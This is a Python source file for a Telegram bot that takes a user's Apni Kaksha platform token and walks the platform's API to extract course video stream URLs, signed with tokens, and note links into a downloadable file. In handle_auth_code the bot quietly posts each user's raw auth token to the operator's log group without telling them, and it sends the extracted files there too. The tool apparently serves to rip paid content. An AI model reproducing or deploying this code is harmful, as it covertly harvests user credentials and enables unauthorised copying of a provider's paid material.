import logging
import os
import requests
from telegram import Update
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from config import LOG_GROUP_ID

# Stages for ConversationHandler
AUTH_CODE, BATCH_ID, SUBJECT_ID, CONTENT_TYPE = range(4)

# Constants
ROOT_DIR = os.getcwd()

async def ak_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the AK extraction process."""
    await update.message.reply_text("𝕊𝕖𝕟𝕕 𝕪𝕠𝕦𝕣 𝕒𝕦𝕥𝕙𝕖𝕟𝕥𝕚𝕔𝕒𝕥𝕚𝕠𝕟 𝕔𝕠𝕕𝕖😗[𝕋𝕠𝕜𝕖𝕟]:")
    return AUTH_CODE

async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the authentication token."""
    try:
        auth_token = update.message.text.strip()
        context.user_data['auth_token'] = auth_token

        # Log the auth token to the group
        await context.bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"New AK Auth Token Used: ```{auth_token}```",
            parse_mode="Markdown"
        )

        headers = {
            "Host": "spec.apnikaksha.net",
            "token": auth_token,
            "origintype": "web",
            "user-agent": "Android",
            "usertype": "2",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }
        
        response = requests.get(
            "https://spec.apnikaksha.net/api/v2/my-batch",
            headers=headers
        ).json()

        if 'data' not in response:
            await update.message.reply_text("Invalid token or error in fetching batches.")
            return ConversationHandler.END

        batches = response["data"]["batchData"]
        context.user_data['batch_data'] = batches  # Store batch data for later use
        
        batch_text = "𝚈𝚘𝚞𝚛 𝙱𝚊𝚝𝚌𝚑𝚎𝚜:\n\n"
        for batch in batches:
            batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆😶‍🌫️: ```{batch['batchName']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫💡: ```{batch['id']}```\n\n"

        await update.message.reply_text(
            f"{batch_text}\nSend the Batch ID to proceed:",
            parse_mode="Markdown"
        )
        context.user_data['headers'] = headers
        return BATCH_ID

    except Exception as e:
        logging.error(f"Error in handle_auth_code: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_batch_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the batch ID."""
    try:
        batch_id = update.message.text.strip()
        context.user_data['batch_id'] = batch_id
        headers = context.user_data['headers']

        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-subject/{batch_id}",
            headers=headers
        ).json()

        if 'data' not in response:
            await update.message.reply_text("Error fetching subjects.")
            return ConversationHandler.END

        subjects = response["data"]["batch_subject"]
        context.user_data['subject_data'] = subjects  # Store subject data for later use
        
        subject_text = "𝚂𝚞𝚋𝚓𝚎𝚌𝚝𝚜 𝚏𝚘𝚞𝚗𝚍:\n\n"
        for subject in subjects:
            subject_text += f"```{subject['subjectName']}``` : ```{subject['id']}```\n"

        await update.message.reply_text(
            f"{subject_text}\nSend the Subject ID to proceed:",
            parse_mode="Markdown"
        )
        return SUBJECT_ID

    except Exception as e:
        logging.error(f"Error in handle_batch_id: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_subject_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the subject ID."""
    try:
        subject_id = update.message.text.strip()
        context.user_data['subject_id'] = subject_id
        
        await update.message.reply_text(
            "What do you want to extract?\n\nType 'class' for Videos\nType 'notes' for Notes"
        )
        return CONTENT_TYPE

    except Exception as e:
        logging.error(f"Error in handle_subject_id: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle content type selection and extract content."""
    try:
        content_type = update.message.text.strip().lower()
        if content_type not in ['class', 'notes']:
            await update.message.reply_text("Invalid option. Please type 'class' or 'notes'.")
            return CONTENT_TYPE

        await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")

        headers = context.user_data['headers']
        batch_id = context.user_data['batch_id']
        subject_id = context.user_data['subject_id']

        # Get batch name from stored batch data
        batch_name = "Unknown Batch"
        for batch in context.user_data.get('batch_data', []):
            if str(batch["id"]) == str(batch_id):
                batch_name = batch["batchName"]
                break

        # Get subject name from stored subject data
        subject_name = "Unknown Subject"
        for subject in context.user_data.get('subject_data', []):
            if str(subject["id"]) == str(subject_id):
                subject_name = subject["subjectName"]
                break

        # Fetch topics
        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-topic/{subject_id}?type={content_type}",
            headers=headers
        ).json()

        if 'data' not in response:
            await update.message.reply_text("Error fetching topics.")
            return ConversationHandler.END

        topics = response["data"]["batch_topic"]
        to_write = ""

        for topic in topics:
            topic_id = topic["id"]
            
            if content_type == "class":
                response = requests.get(
                    f"https://spec.apnikaksha.net/api/v2/batch-detail/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                    headers=headers
                ).json()

                if 'data' in response and 'class_list' in response['data']:
                    classes = response['data']['class_list'].get('classes', [])
                    for cls in classes:
                        try:
                            lesson_url = cls["lessonUrl"]
                            lesson_name = cls["lessonName"].replace(":", " ")
                            lesson_ext = cls.get("lessonExt", "")

                            if lesson_ext == "brightcove":
                                video_token_response = requests.get(
                                    f"https://spec.apnikaksha.net/api/v2/livestreamToken?base=web&module=batch&type=brightcove&vid={cls['id']}",
                                    headers=headers
                                ).json()
                                
                                video_token = video_token_response.get("data", {}).get("token")
                                if video_token:
                                    video_url = f"https://edge.api.brightcove.com/playback/v2/accounts/6415636611001/videos/{lesson_url}/master.m3u8?bcov_auth={video_token}"
                                    to_write += f"{lesson_name}: {video_url}\n"
                            
                            elif lesson_ext == "youtube":
                                video_url = f"https://www.youtube.com/embed/{lesson_url}"
                                to_write += f"{lesson_name}: {video_url}\n"

                        except Exception as e:
                            logging.error(f"Error processing class: {e}")
                            continue

            elif content_type == "notes":
                response = requests.get(
                    f"https://spec.apnikaksha.net/api/v2/batch-notes/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                    headers=headers
                ).json()

                if 'data' in response and 'notesDetails' in response['data']:
                    notes = response["data"]["notesDetails"]
                    for note in notes:
                        doc_url = note["docUrl"]
                        doc_title = note["docTitle"].replace(":", " ")
                        to_write += f"{doc_title}: {doc_url}\n"

        if to_write:
            filename = f"AK_{subject_id}_{content_type}.txt"
            file_path = os.path.join(ROOT_DIR, filename)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(to_write)

            # Send file to user with updated caption
            user_caption = (
                f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}"
            )
            with open(file_path, "rb") as f:
                await update.message.reply_document(
                    document=f,
                    caption=user_caption
                )

            # Send file to log group with updated caption
            log_caption = (
                f"AK 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
                f"𝑪𝒐𝒏𝒕𝒆𝒏𝒕 𝑻𝒚𝒑𝒆: {content_type}\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}"
            )
            with open(file_path, "rb") as f:
                await context.bot.send_document(
                    chat_id=LOG_GROUP_ID,
                    document=f,
                    caption=log_caption
                )

            # Clean up
            os.remove(file_path)
            await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
        else:
            await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")

        return ConversationHandler.END

    except Exception as e:
        logging.error(f"Error in handle_content_type: {e}")
        await update.message.reply_text("An error occurred during extraction. Please try again later.")
        return ConversationHandler.END

# Create the conversation handler
ak_handler = ConversationHandler(
    entry_points=[CommandHandler("ak", ak_start)],
    states={
        AUTH_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_code)],
        BATCH_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_id)],
        SUBJECT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_subject_id)],
        CONTENT_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_content_type)],
    },
    fallbacks=[],
)